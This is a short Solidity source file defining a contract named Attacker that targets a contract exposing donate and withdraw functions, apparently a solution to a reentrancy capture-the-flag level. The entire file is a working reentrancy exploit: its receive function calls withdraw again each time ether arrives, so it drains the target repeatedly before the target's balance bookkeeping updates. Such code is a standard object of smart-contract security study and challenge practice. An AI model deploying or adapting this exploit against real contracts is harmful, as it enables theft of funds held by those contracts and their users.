// SPDX-License-Identifier: MIT
pragma solidity ^0.7.4;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract Attacker {

    address private reentrance;

    function fire(address _reentrance) external {
        reentrance = _reentrance;
        withdraw(1 ether);
    }

    function withdraw(uint256 _value) private {
        IReentrance(reentrance).withdraw(_value);
    }
    
    receive() external payable {
        withdraw(1 ether);
    }
    
}
